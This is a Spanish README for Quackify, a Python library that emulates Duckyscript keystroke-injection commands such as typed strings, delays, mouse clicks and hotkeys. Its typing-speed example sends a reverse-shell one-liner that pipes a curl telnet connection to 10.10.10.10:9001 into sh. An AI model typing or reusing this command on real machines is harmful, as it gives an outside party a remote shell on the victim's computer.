# Quackify

<img src="https://media.discordapp.net/attachments/995599976463859713/1194480347782590658/quackify_logo_png.png">

-----------

*Quackify es una biblioteca para Python que emula diversas funciones del Duckyscript.*

Entre varias de ellas, encontramos funciones básicas como "string", "rem" y "delay".

Muchas de las funciones se inspiraron en [DuckyPad](https://github.com/dekuNukem/duckyPad).

# Uso

## Funciones

#### String

La función "string" emula lo que sería un "string" normal en un Duckyscript.

```
STRING Hola Mundo
```

El dispositivo simplemente emulará la entrada de teclado de las letras "H", "o", "l", "a", espacio, "M", "u", "n", "d", "o" en ese orden. Esencialmente, el script simulará que alguien está escribiendo "Hola Mundo" en el teclado de la computadora.

Convertido a python, seria:

```python
from quackify import send

send.string("Hola Mundo")
```

### Rem 

La función "rem" emula lo que sería el comentario en Duckyscript, comúnmente utilizado para proporcionar explicaciones o notas.

```
REM Este es un comentario en un Duckyscript.
```

Convertido a python, seria:

```python
from quackify import rem

rem.add_comment("Este es un comentario en Quackify")
```

### Delay 

La función "delay" emula lo que sería la pausa por un tiempo determinado en un Duckyscript.

```
STRING Hola
DELAY 500
STRING Mundo
```

En este caso, el script primero simula la entrada de teclado "Hola" y luego espera 500 milisegundos (o medio segundo) antes de simular la entrada de teclado "Mundo".

Convertido a python, seria:

```python
from quackify import send, delay

send.string("Hola")
delay.delay(500)
send.string("Mundo")
```

### Interacción con el ratón.

Quackify también incluye funciones para interactuar con el cursor, como clic derecho, clic izquierdo, emulación de clic de rueda del mouse, así como para mover el cursor a coordenadas específicas y para imprimir las coordenadas actuales del cursor.

```python
# mouse_click.right()  =  RMOUSE
# mouse_click.left() = LMOUSE
# mouse_clicl.middle() = MMOUSE
````

Emular click derecho, izquierdo y rueda del mouse:

```python
from quackify import mouse_click

# Click derecho
mouse_click.right()

# Click  izquierdo

mouse_click.left()

# Clickear usando la rueda del mouse

mouse_click.middle()
```

Con Quackify, también puedes emular el movimiento del cursor de manera similar a la función "MOUSE_MOVE" de DuckyPad.

```python
from quackify import mouse_move

mouse_move.move(1344, 17)
```

Con esto, el cursor se moverá a las coordenadas proporcionadas. Además, Quackify incluye la función **"get_pos"**, que nos permitirá visualizar la posición actual del cursor.

```python
from quackify import mouse_move

mouse_move.get_pos()
```

Con esto, se mostrarían las coordenadas x,y del cursor, y no sería necesario agregar un comando print, ya que este ya está integrado en el código.

### Velocidad de escritura

También, la función string incluye una función adicional llamada **"speed"**. Con esta función, podremos configurar la velocidad a la que el script escribirá, como se muestra en el siguiente ejemplo:

```python
from quackify import send

send.speed(1)
send.string("C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul")
```

Si se desea ajustar la velocidad de escritura, es necesario **declarar la función "send.speed" antes de llamar la funcion "send.string"**.

Un número mayor, por ejemplo, 1, 2, 3, hará que la escritura sea más lenta. En cambio, si el número es menor, como 0.9, 0.5, 0.4, la escritura será más rápida.

### Hotkeys

Quackify también incorpora la capacidad de simular pulsaciones de teclas especiales, como ctrl, alt, shift, tab, enter, entre otras.

```python
from quackify import hotkeys

hotkeys.hotkey('win+r')
````

Aquí podemos simular la pulsación de teclas, como Windows + R, utilizando una única línea de código.

**Todas las hotkeys disponibles en quackify:**

```python
['\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
'8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
'browserback', 'browserfavorites', 'browserforward', 'browserhome',
'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
'command', 'option', 'optionleft', 'optionright']
```

Si es necesario combinar más de una combinación de teclas, se tendría que colocar de la siguiente manera:

```python
from quackify import hotkeys

hotkeys.hotkey('win+v')
```

En este ejemplo, se muestra la combinación de teclas para abrir el portapapeles de Windows. 

En caso de que solo sea necesario pulsar una tecla especial, únicamente se colocaría el nombre de esta.

```python
from quackify import hotkeys

hotkeys.hotkey('enter')
```

### Loops

Aunque Quackify no incorpora bucles personalizados, es posible realizarlos fácilmente utilizando la sintaxis de Python. Observemos la recreación de este código de Duckyscript en Python:

```
STRING Hello world
REPEAT 10
```

Esto repetiría la instrucción "STRING Hello world" 10 veces.

En Python, se traduciría de la siguiente manera:

```python
from quackify import send

for _ in range(10):
   send.string("Hello World")
```

## Instalacion

*Usando pip*

```
pip install quackify
```

*Desde setup.py*

```bash
python setup.py install
```

# Licencia

[MPL-2.0 license](https://github.com/Euronymou5/Quackify/blob/main/LICENSE)

# Contacto

*Preguntas, dudas, ideas:*

**• Discord: euronymou5**

*Bugs, Problemas de instalacion*:

• **[Reportar en los GitHub Issues](https://github.com/Euronymou5/Quackify/issues)**
